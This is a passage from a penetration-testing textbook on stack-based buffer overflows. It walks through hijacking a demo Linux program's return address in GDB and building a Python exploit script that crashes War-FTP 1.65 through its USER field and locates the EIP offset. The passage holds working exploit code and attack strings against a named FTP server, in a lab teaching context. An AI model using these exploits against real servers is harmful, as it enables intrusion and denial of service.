we can expect to see\nparts of our stack get overwritten with As. When we hit our first breakpoint,\nwe’re still in main, and everything looks normal so far. The trouble shouldn’t\nstart until our third breakpoint, after strcpy is executed with too many As. note main’s stack frame is still 12 bytes long, though it has moved 32 bytes up the stack. This is due to changes in the length of the command line argument, and so on. The\nsize of the stack frame will be consistent throughout. Let’s note one thing at the second breakpoint in Listing 16-10 before we\nmove on to the really interesting part. Breakpoint 2, function (str=0xbffff735 'A' <repeats 30 times>)\nat overflowtest.c:10\n10 strcpy(buffer, str);\n(gdb) x/16xw $esp\n0xbffff500: 0xb7f93849 0x08049ff4 0xbffff518 0x080482e8\n0xbffff510: 0xb7fcfff4 0x08049ff4 0xbffff528 0x08048443u\n0xbffff520: 0xbffff735 0xbffff540 0xbffff598 0xb7e8c685\n0xbffff530: 0x08048470 0x08048340 0xbffff598 0xb7e8c685\n(gdb) x/1xw $ebp\n0xbffff518: 0xbffff528\n372 Chapter 16\n(gdb) continue\nContinuing. Listing 16-10: Examining memory at breakpoint 2\nYou can see here that function1’s stack frame has also moved up 32 bytes. Also note that our return address still holds the memory address 0x08048443 u. Though our stack frame has moved around a bit, the instructions in mem-\nory to be executed are in the same place. Use the continue command again to move on to the third breakpoint. This is where things get interesting, as shown in Listing 16-11. Breakpoint 3, function (str=0x41414141 <Address 0x41414141 out of bounds>)\nat overflowtest.c:11\n11 }\n(gdb) x/16xw $esp\n0xbffff500: 0xbffff513 0xbffff733 0xbffff518 0x080482e8\n0xbffff510: 0x41fcfff4 0x41414141 0x41414141 0x41414141\n0xbffff520: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff530: 0x08040041 0x08048340 0xbffff598 0xb7e8c685\n(gdb) continue\nContinuing. Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? ()\n(gdb)\nListing 16-11: Return address overwritten by As\nLet’s examine the memory again at our third breakpoint, directly after\nstrcpy but before function1 returns to main. This time, not only is the return\naddress overwritten by As at u but part of main’s stack frame is overwritten\nas well. At this point, there is no hope for the program to recover. When function1 returns, the program attempts to execute the instruc-\ntions at the return address for main, but the return address has been over-\nwritten with our As, causing the expected segmentation fault when trying\nto execute the instruction at the memory address 41414141. (In the coming\nsections, we’ll discuss replacing the return address with something that\nredirects the program to code of our own instead of crashing it.)\nControlling EIP\nMaking the program crash is interesting in and of itself, but as exploit\ndevelopers, our goal is to hijack execution if possible and get the target\nCPU to execute code on our behalf. Perhaps by manipulating the crash, we\ncan execute other instructions that the developer never intended. Currently, our program crashes when it tries to execute the instructions\nat the memory address 41414141, which is out of bounds. We need to change\nour argument string to include a valid memory address that our program\ncan access. If we can replace the return address with another valid memory\nlocation, we should be able to hijack execution when function1 returns. A Stack-Based Buffer Overflow in Linux 373\nPerhaps the developer even left some debugging code in the program that we\ncan use to illustrate this purpose. (But I’m getting a bit ahead of myself here.)\nTo redirect execution, we first need to determine where the return\naddress is overwritten by our long string of As. Let’s look back at what our\nstack looked like when we ran our program normally with only four charac-\nters for our argument, as shown here. 0xbffff520: 0xbffff533 0xbffff74c 0xbffff538 0x080482e8\n0xbffff530: 0x41fcfff4 0x00414141u 0xbffff500v 0x08048443w\nWe can see where the four As u were copied into the local variable,\nbuffer. Now, recall that the four bytes directly after EBP v contain the return\naddress 0x08048443 w. We can see that after the four As, there are five more\nbytes in function1’s stack frame, which come before the return address. Looking at memory, it stands to reason that if we give our program an\nargument that is 5 + 4 + 4 bytes long, the last four bytes will overwrite the\nreturn address. We can test this by sending our program an argument of\nnine As followed by four Bs. If our program crashes when trying to execute\nthe instruction at memory address 42424242 (the hexadecimal representa-\ntion of B), we’ll know we have calculated our offset correctly. We can use Perl again to help us create our argument string, as shown in\nListing 16-12. (gdb) delete 1\n(gdb) delete 2\n(gdb) run $(perl -e 'print \"A\" x 9 . \"B\" x 4')\nThe program being debugged has been started already. Start it from the beginning? (y or n) y\nStarting program: /home/georgia/overflowtest $(perl -e 'print \"A\" x 9 . \"B\" x 4')\nListing 16-12: Starting the program with a new attack string\nBefore we run the program with this new argument, delete the first two\nbreakpoints because the state of memory won’t change in an interesting way\nuntil our third breakpoint, after strcpy is executed. Start the program using Perl, with nine As followed by four Bs as the\nattack string. Because the program crashed on its last run, you will be\nasked if you would like to start from the beginning. Enter y for yes. When\nwe examine memory at our only remaining breakpoint, everything looks\nas predicted, as shown in Listing 16-13. Breakpoint 3, function (str=0xbffff700 \"\\017\") at overflowtest.c:11\n11 }\n(gdb) x/20xw $esp\n0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8\n0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x42424242u\n0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685\n0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685\n0xbffff550: 0x00000002 0xbffff5d4 0xbffff5e0 0xb7fe2b38\n(gdb) continue\n374 Chapter 16\nContinuing. Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? ()\n(gdb)\nListing 16-13: Overwriting the return address with Bs\nWhere we previously saw our return address (0x08048443), we now have\n0x42424242.\n\nIf we let the program continue, we can see that it crashes while\ntrying to execute the memory address of four Bs u. This is once again out\nof bounds, but at least now we know where to place the address of the code\nwe want to execute. We have now pinpointed which four bytes in our attack string overwrite\nthe return address. Remember that the return address is loaded into EIP\nwhen function1 returns. Now we just need to find somewhere more interest-\ning to send execution than 41414141 or 42424242. Hijacking Execution\nWe’ve determined where to overwrite the return address in our argument\nstring, but we still need something to put there. (This example may seem\na bit contrived compared to the rest of the exploit development examples\nwe’ll cover, but it illustrates the underlying concepts well.) We’ve managed to\nmanipulate an issue with the strcpy function used by the program to break\nout of the buffer variable and overwrite additional memory addresses,\nincluding the return address. Looking back at our source code for overflowtest.c, recall the program\ncontains another function in addition to main and function1. The first function\nin the program, called overflowed, prints “Execution Hijacked” out to the con-\nsole and then returns. This extra function is never called when the program\nruns normally, but as its output implies, we can use it to hijack execution. Returning to our debugger, if we can find the start of overflowed in mem-\nory, we should be able to replace our four Bs with that memory address, over-\nwrite the return address, and force the program to execute instructions the\ndevelopers didn’t intend it to. We have the source code and know the function\nname we are looking for, so this task is trivial. Let’s just disassemble overflowed\nand find out where it is loaded in memory, as shown in Listing 16-14. (gdb) disass overflowed\nDump of assembler code for function overflowed:\nu 0x080483f4 <overflowed+0>: push %ebp\n0x080483f5 <overflowed+1>: mov %esp,%ebp\n0x080483f7 <overflowed+3>: sub $0x8,%esp\n0x080483fa <overflowed+6>: movl $0x8048520,(%esp)\n0x08048401 <overflowed+13>: call 0x804832c <puts@plt>\n0x08048406 <overflowed+18>: leave\n0x08048407 <overflowed+19>: ret\nEnd of assembler dump. (gdb)\nListing 16-14: Disassembling overflowed\nA Stack-Based Buffer Overflow in Linux 375\nAs you can see, the memory address 0x80483f4 u holds the first instruc-\ntion of overflowed. If we redirect our program here, it will execute all the\ninstructions in that function. note This won’t give us a reverse shell or join the target to a botnet; it will only print out\n“Execution Hijacked” to the screen. We will look at more exciting execution hijacks in\nthe exploit development examples in the next three chapters. We can use Perl to help us create our argument string, which will\ninclude hexadecimal bytes for the memory address we want to use to over-\nwrite the return address, as shown here. (gdb) run $(perl -e 'print \"A\" x 9 . \"\\x08\\x04\\x83\\xf4\"')\nStarting program: /home/georgia/overflowtest $(perl -e 'print \"A\" x 9 . \"\\x08\\x04\\x83\\xf4\"')\nThis time, we replace our four Bs with \\x08\\x04\\x83\\xf4, which should\nredirect execution to the beginning of overflowed. But things don’t work out\nas planned, as shown in Listing 16-15. Breakpoint 3, function (str=0xbffff700 \"\\017\") at overflowtest.c:11\n11 }\n(gdb) x/16xw $esp\n0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8\n0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0xf4830408u\n0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685\n0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685\n(gdb) continue\nContinuing. Program received signal SIGSEGV, Segmentation fault. 0xf4830408 in ?? ()\nListing 16-15: The return address bytes are flipped. As you can see, we hit our breakpoint as expected, but when we exam-\nine memory, we seem to have a little problem. The memory address of the\nfirst instruction in overflowed is 0x80483f4, but the return address on our stack\nis 0xf4830408 u. The digits aren’t entirely reversed, but the bytes are in the\nwrong order. Recall that two hexadecimal digits make up one byte. When we let the\nprogram continue, we receive another access violation for trying to execute\ndata at 0xf4830408. We know that the program crashes because the new\nreturn address is wrong, so let’s look at how those bytes wound up out of\norder in the first place so we can fix the problem. Endianness\nWhen I was first learning basic exploit development, I spent many hours\nscratching my head and wondering what could possibly be keeping my exploit\nfrom working. I had run into this same problem, and unfortunately, I hadn’t\nbeen paying attention in operating systems class when we covered endianness. 376 Chapter 16\nIn the 1726 novel Gulliver’s Travels, Jonathan Swift’s titular character\nis shipwrecked on the island of Lilliput. Lilliput is currently on bad terms\nwith neighboring Blefuscu because of a dispute about how to properly crack\nan egg. In Lilliput, eggs are cracked at the little end, and in Blefuscu, eggs\nare cracked at the big end. We have a similar dispute in computer science\nregarding byte order. Big endians believe that the most significant byte\nshould be stored first, whereas little endians store the least significant byte\nfirst. Our Ubuntu virtual machine has an Intel architecture, which is little\nendian. To account for little-endian architecture, we need to flip the bytes\nof our memory address around, as shown here. (gdb) run $(perl -e 'print \"A\" x 9 . \"\\xf4\\x83\\x04\\x08\"')\nThe program being debugged has been started already. Start it from the beginning? (y or n) y\nStarting program: /home/georgia/overflowtest $(perl -e 'print \"A\" x 9 . \"\\xf4\\x83\\x04\\x08\"')\nUsing the return address \\xf4\\x83\\x04\\x08 with the byte order flipped\nfor our Intel architecture fixes our problem, as shown in Listing 16-16. Breakpoint 3, function (str=0xbffff700 \"\\017\") at overflowtest.c:11\n11 }\n(gdb) x/16xw $esp\n0xbffff510: 0xbffff523 0xbffff744 0xbffff528 0x080482e8\n0xbffff520: 0x41fcfff4 0x41414141 0x41414141 0x080483f4\n0xbffff530: 0xbffff700 0xbffff550 0xbffff5a8 0xb7e8c685\n0xbffff540: 0x08048470 0x08048340 0xbffff5a8 0xb7e8c685\n(gdb) continue\nContinuing. Execution Hijacked u\nProgram received signal SIGSEGV, Segmentation fault. 0xbffff700 in ?? ()\n(gdb)\nListing 16-16: Successfully hijacking execution\nThis time when we hit the breakpoint, our return address looks correct. Sure enough, when we let the program continue, “Execution Hijacked” is\nprinted to the console at u, meaning we have successfully hijacked execu-\ntion and exploited a buffer overflow vulnerability. To see the results outside the debugger, we run overflowtest from the\ncommand line with an argument that includes the new return address, as\nshown here. georgia@ubuntu:~$ ./overflowtest $(perl -e 'print \"A\" x 9 . \"\\xf4\\x83\\x04\\x08\"')\nExecution Hijacked\nSegmentation fault\nA Stack-Based Buffer Overflow in Linux 377\nNote that after overflowed returns, the program crashes with a segmen-\ntation fault when executing the memory address bffff700. This address is\nthe same as the next four bytes on the stack after our return address. And\nthinking back to how memory works, this makes sense, but our “malicious”\ncode was fully executed prior to the crash. After the stack frame for overflowed\nis popped off the stack, bffff700 appears to be in the place of the return\naddress. We sent execution straight to overflowed without normal function-\ncalling things like saving a return address. When overflowed’s stack frame is\nunwound from the stack, the next memory address of the stack is assumed\nto be the return address, but this is just part of main’s stack frame, so we crash. How might you augment your attack string to fix this? You guessed it:\nYou could add another four bytes to our attack string, sending execution\nback to the original return address in main. Because we have corrupted\nmain’s stack frame, we may still run into trouble down the line, but we can\nmeet our goal of tricking the program into executing code on our behalf. summary\nIn this chapter we looked at a simple C program with a buffer overflow\nvulnerability (namely the use of the insecure strcpy function) that does not\ncheck its array boundaries, which allows us to write to adjacent memory. We\nexploited this issue by writing a longer string to the command line than the\nprogram expected. We hijacked the program’s execution by overwriting a\nfunction’s return address with our own value. We sent execution to another\nfunction included in the original program. Now that you’ve seen a basic example of a stack-based overflow, let’s\nmove on to something a bit more complex. In the next chapter, our example\nwill focus on a Windows-based target and a real-world target program. 378 Chapter 16\n17\na staCk-BaseD Buffer\noVerflow in winDows\nIn this chapter, we will look at exploiting a stack-based\nbuffer overflow in an older version of a Windows-based\nFTP server. As we did in Chapter 16, we will attempt\nto overwrite the return pointer saved onto the stack\nwhen a function is called, as shown earlier in Figure 16-3 on page 364. When the function main calls function1, the next instruction to be executed is\nsaved on the stack, and a stack frame for function1 is added to the stack. The size of function1’s local variables is determined when the applica-\ntion is compiled and fixed. The amount of space “reserved” on the stack for\nthese local variables is fixed, too. This reservation is called a stack buffer. If we\nput more data in the stack buffer than it can hold, we will cause the buffer\nto overflow. Then we may be able to overwrite the saved return address,\nwhich is placed after the stack buffer, and take control of program execu-\ntion. (For a more detailed review of this process, see Chapter 16.)\nIn Chapter 1, we installed War-FTP version 1.65 on the Windows XP tar-\nget, but we didn’t start it. We have exploited the FileZilla FTP server in previ-\nous chapters, and if you’ve been following along, that FTP server is still\nrunning. Before we can use War-FTP, we need to stop\nthe FileZilla FTP server using the XAMPP control panel. This will open TCP port 21 for War-FTP. Open War-\nFTP on the Windows XP desktop by double clicking\nits icon (see Figure 17-1), and click the lightning bolt\nin the top-left corner of the War-FTP window to put it Figure 17-1: War-\nonline (see Figure 17-2).\n\nFTP icon\nsearching for a known Vulnerability in war-FtP\nA search on Google for known vulnerabilities in War-FTP 1.65 finds the fol-\nlowing information on SecurityFocus.com:\nWar-FTP Username Stack-Based Buffer-Overflow Vulnerability\nWar-FTP is prone to a stack-based buffer-overflow vulnerability\nbecause it fails to properly check boundaries on user-supplied\ndata before copying it to an insufficiently sized buffer. Exploiting this issue could lead to denial-of-service conditions\nand to the execution of arbitrary machine code in the context of\nthe application. In Chapter 16, we overflowed a function’s local variable on the stack\nwith supplied input and redirected execution to a memory location of our\nchoosing. Based on this information from SecurityFocus.com, it looks like we\ncan do something similar with War-FTP 1.65. In this chapter, we will manu-\nally exploit War-FTP 1.65’s stack-based buffer overflow vulnerability in the\nUsername field of the FTP login. Now that we are using a real program\nrather than demo code, we will learn more about writing real exploits. For\nexample, this time we won’t be able to simply redirect execution to another\nfunction; we will instead need to introduce instructions to be executed as\npart of our attack string. To get started, make sure War-FTP 1.65 is open and running on your Win-\ndows XP virtual machine. (The lightning bolt icon in the top-left corner of the\nGUI shown in Figure 17-2 tells the server to listen for incoming connections.)\nThe issue we are going to exploit is particularly dangerous because\nan attacker does not need to log in to the FTP server before launching an\nattack. Thus, we do not need to add any legitimate users to the FTP server\nfor this attack to work. Before we dive in and start trying to exploit War-FTP, let’s hook it\nup to a debugger. Immunity Debugger should be on the desktop of your\nWindows XP target because we installed it in Chapter 1. If it is not, follow\nthe instructions in Chapter 1 for setting up Immunity Debugger and the\nMona plugin. Like GDB, Immunity Debugger will allow us to see the inter-\nnals of memory as we attempt to exploit War-FTP. Unfortunately, we don’t\nhave source code to guide us toward a successful exploit, but by watching\nour program in memory as we send it attack strings, we should still be able\nto develop a working exploit. 380 Chapter 17\nFigure 17-2: War-FTP 1.65 GUI\nStart Immunity Debugger, open the File menu, and select Attach. We\nwant to attach Immunity Debugger to the running War-FTP process, which\nwe see in the process list in Figure 17-3. Highlight War-FTP 1.65, and click\nAttach. Figure 17-3: Process list in the Immunity Debugger interface\nA Stack-Based Buffer Overflow in Windows 381\nWhen Immunity Debugger first attaches to a process, it pauses the pro-\ncess’s execution. If at any point your exploit just randomly stops working,\ncheck to make sure the process is running. A paused process isn’t listening\nfor incoming connections, and, as you can see in the lower-right corner\nof the Immunity Debugger window in Figure 17-4, the process is paused. Click the Play button at the top-left corner of the screen to tell the process\nto continue running. Figure 17-4: War-FTP pauses in Immunity Debugger. With War-FTP running in Immunity Debugger, we can figure out how\nto exploit its buffer overflow vulnerability. Causing a Crash\nIn Chapter 19, we will use a technique called fuzzing to look for potential\nvulnerabilities in programs, but for now, follow my lead on which attack\nstrings to use to crash the program. In the Username field of the FTP login,\nlet’s send a string of 1,100 As instead of a username. Rather than attacking\nour program locally, as we did in the previous example, this time we will\n382 Chapter 17\ncreate our exploit in Kali Linux and set up the exploit to talk to the FTP\nserver over the network. Listing 17-1 shows a starter exploit that will cause\nthe War-FTP program to crash. note Our exploit examples are written in Python, but they can easily be ported into another\nlanguage if you’d prefer to use a different one. root@kali:~# cat ftpexploit\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 1100\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM) u\nconnect=s.connect(('192.168.20.10',21)) u\nresponse = s.recv(1024)\nprint response v\ns.send('USER ' + buffer + '\\r\\n') w\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-1: Python exploit to crash War-FTP\nIn the exploit shown in Listing 17-1, we first import the socket Python\nlibrary. Next, we create a string called buffer, which contains 1,100 As, and\nset up a socket at u to connect to our Windows XP machine on port 21,\nwhere the War-FTP server is listening. Next, we accept and print out the\nFTP server’s banner to the screen at v. Our exploit then sends over the USER\ncommand with 1,100 As w for the username in hopes of causing the FTP\nserver to crash. If the server responds and asks for our password, the exploit is ready\nto finish the connection with the password, PASSWORD. However, if our\nexploit succeeds, it won’t matter if our credentials are valid, because the\nprogram will crash before it finishes the login process. Finally, we close our\nsocket, and the exploit finishes. Make sure the Python script is executable\nwith chmod +x, and run the exploit as shown here. root@kali:~# chmod +x ftpexploit\nroot@kali:~# ./ftpexploit\n220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready\n220 Please enter your user name. 331 User name okay, Need password. As with the previous example, we hope to overwrite the saved return\naddress with a string of As and cause the program to crash. The War-FTP\nserver sends over its welcome banner, prompts us for our username, and\nthen asks for a password. Take a look at War-FTP in Immunity Debugger,\nas shown in Figure 17-5, to see if our exploit managed to cause a crash. A Stack-Based Buffer Overflow in Windows 383\nFigure 17-5: War-FTP crashes due to a buffer overflow. After we run our exploit, we see that War-FTP is paused due to an access\nviolation when attempting to execute an instruction at 41414141. Based on\nwhat we learned in the Linux buffer overflow example in Chapter 16, this\nresult should seem familiar. A return address was overwritten by our long\nstring of As, so when the function returned, 41414141 was loaded into the\nEIP register. The program attempted to execute the instructions at that\nmemory location, which was out of bounds and caused a crash. Locating eiP\nAs with the previous example, we need to know which four As in our string\nare overwriting the return address. Unfortunately, 1,100 As is a bit more\nthan the 30 we used in the previous chapter, so just counting in memory is\nmore difficult in this case. Also, we can’t be sure if the first As we’re seeing\non the stack are the first As sent as part of the exploit. Traditionally, the next step would be to crash the program again with\n550 As followed by 550 Bs. If the program crashed with 41414141 in EIP, then\nthe return address overwrite occurred in the first 550 bytes; if it crashed\nwith 42424242 in EIP, the overwrite was in the second half. From there, the\nhalf of the string in question would be split into 275 As followed by 275 Bs. Slowly but surely, this method would narrow down the exact location. 384 Chapter 17\nGenerating a Cyclical Pattern to Determine Offset\nLuckily, we can use Mona to generate a unique cyclic pattern to find the\nright four bytes for the return address overwrite in only one iteration. To\nuse Mona for this task, enter !mona pattern_create with length 1100 as an\nargument at the bottom of the Immunity Debugger window, as shown in\nFigure 17-6. Figure 17-6: Using pattern_create in Mona\nThe 1,100-character cyclic pattern is written to the file C:\\logs\\war-ftpd\\\npattern.txt, as shown in Listing 17-2. =============================================================================\nOutput generated by mona.py v2.0, rev 451 - Immunity Debugger\nCorelan Team - https://www.corelan.be\n=============================================================================\nOS : xp, release 5.1.2600\nProcess being debugged : war-ftpd (pid 2416)\n=============================================================================\n2015-11-10 11:03:32\n=============================================================================\nPattern of 1100 bytes :\n-----------------------\nA Stack-Based Buffer Overflow in Windows 385\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5\nAc6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1\nAf2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7\nAh8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3\nAk4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9\nAn0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5\nAp6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1\nAs2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7\nAu8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3\nAx4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9\nBa0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5\nBc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1\nBf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7\nBh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3\nBk4Bk5Bk\nListing 17-2: Output of the pattern_create command\nWe are going to replace the long string of As with the unique pattern\nshown in Listing 17-2.\n\nBut before running the exploit again, we need to\nrestart War-FTP from the previous crash. In Immunity Debugger, go to\nDebug4Restart, and then press the Play button and click the lightning\nbolt icon to tell War-FTP to listen on the network. (Follow these steps each\ntime you need to restart War-FTP after a crash.) Alternatively, you can\nclose Immunity Debugger, restart War-FTP manually, and attach to the new\nprocess in the debugger. Replace the value of the buffer in the exploit with\nthe pattern from Listing 17-2, surrounded by quotation marks to make it a\nstring in Python, as shown in Listing 17-3. note If War-FTP refuses to restart with the error Unknown format for user database, find\nand delete the files FtpDaemon.dat and/or FtpDaemon.ini that were created on the\ndesktop by War-FTP. This should fix the problem and War-FTP should start normally. root@kali:~# cat ftpexploit\n#!/usr/bin/python\nimport socket\nu buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\nAc3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8\nAe9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4\nAh5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0\nAk1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6\nAm7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2\nAp4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ap3Ar7Ar8\nAr9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4\nAu5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Ax2Ax3Ax4\nAx5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0\nBa1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7\nBc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3\nBf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9\nBi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5\nBk\"\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\n386 Chapter 17\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-3: Exploit with cyclic pattern\nNow run the exploit again with the generated pattern starting at u,\nreplacing the 1,100 As. root@kali:~# ./ftpexploit\n220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready\n220 Please enter your user name. 331 User name okay, Need password. Having run our exploit with Metasploit’s pattern, look back at Immunity\nDebugger, as shown in Figure 17-7, to see what value is contained in EIP and\nto find out where in our attack string we overwrite the return address. Figure 17-7: Finding the return address overwrite\nWar-FTP has crashed again, but this time EIP contains four bytes of our\ngenerated pattern: 32714131. We can use Mona to determine where exactly in\nA Stack-Based Buffer Overflow in Windows 387\nthe 1,100-character cyclic pattern the ASCII equivalent of 32714131 is. Enter\n!mona pattern_offset 32714131 to get just the offset, or enter !mona findmsp at the\nImmunity Debugger prompt, as shown in Figure 17-8, to have Mona perform\nadditional analysis on all registers and on instances of the pattern in memory. Figure 17-8: Finding the pattern offsets in Mona\nMona finds instances of the cyclic pattern in memory. The output of\nthe command is written to C:\\logs\\war-ftpd\\findmsp.txt. Part of the output is\nshown here. EIP contains normal pattern : 0x32714131 (offset 485)\nESP (0x00affd48) points at offset 493 in normal pattern (length 607)\nEDI (0x00affe48) points at offset 749 in normal pattern (length 351)\nEBP (0x00affda0) points at offset 581 in normal pattern (length 519)\nVerifying Offsets\nAccording to Mona, our return address overwrite is 485 bytes into the attack\nstring. We can verify this, as shown in Listing 17-4. root@kali:~# cat ftpexploit\n#!/usr/bin/python\nimport socket\n388 Chapter 17\nu buffer = \"A\" * 485 + \"B\" * 4 + \"C\" * 611\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-4: Verifying the EIP offset\nNow we’ll create an attack string that contains 485 As, 4 Bs, and 611 Cs as\nshown at u in Listing 17-4. With our new string in place, if EIP contains\n42424242 when the program crashes, we’ll know we have found the correct four\nbytes for the return address. (Remember to restart War-FTP in Immunity\nDebugger before running the exploit again.) Now, check EIP, as shown in\nFigure 17-9. As expected, War-FTP has crashed again, this time with 42424242 in EIP. This result confirms that we have found the location of the return address\nin our attack string. Next we need to find someplace to redirect execution\nand exploit this buffer overflow vulnerability. Figure 17-9: War-FTP crashes with EIP filled with Bs\nA Stack-Based Buffer Overflow in Windows 389\nhijacking execution\nIn the exploit example discussed in Chapter 16, we sent execution to another\nfunction. Unfortunately, because we don’t have the source code of War-FTP\nto review for potentially interesting code, we’ll use a more typical technique\nfor exploit development this time. Instead of redirecting execution to some-\nwhere else in the program, we will introduce our own instructions and\nredirect execution to part of our attack string. First, we need to find out if part of our attack string is easily accessible\nat the time of the crash. Look back at the output of the !mona findmsp com-\nmand in C:\\logs\\warftp-d\\findmsp.txt, as shown here. EIP contains normal pattern : 0x32714131 (offset 485)\nESP (0x00affd48) points at offset 493 in normal pattern (length 607)\nEDI (0x00affe48) points at offset 749 in normal pattern (length 351)\nEBP (0x00affda0) points at offset 581 in normal pattern (length 519)\nIn addition to taking control of EIP, the registers ESP, EDI, and EBP\nalso point to part of the attack string. In other words, our attack string\ndecides the contents of these registers, and there’s nothing to stop us from\nreplacing the part of the attack string (the Cs in our current crash) with\nuseful instructions for the CPU to execute. We can see that ESP is at memory address 00AFFD48, while EBP is slightly\nhigher in memory at address 00AFFDA0. EDI is at 00AFFE48. We could redirect\nexecution to any of these locations, but with the lower address farther up\nthe stack, we have a little more space for our instructions. note Also, note that ESP does not point directly to the beginning of our Cs. Our saved\nreturn pointer overwrite is at byte 485 in the pattern, but ESP is at 493, eight bytes\naway (four bytes for the return address and four bytes of Cs). Right-click ESP in the top right of the Immunity Debugger window,\nand 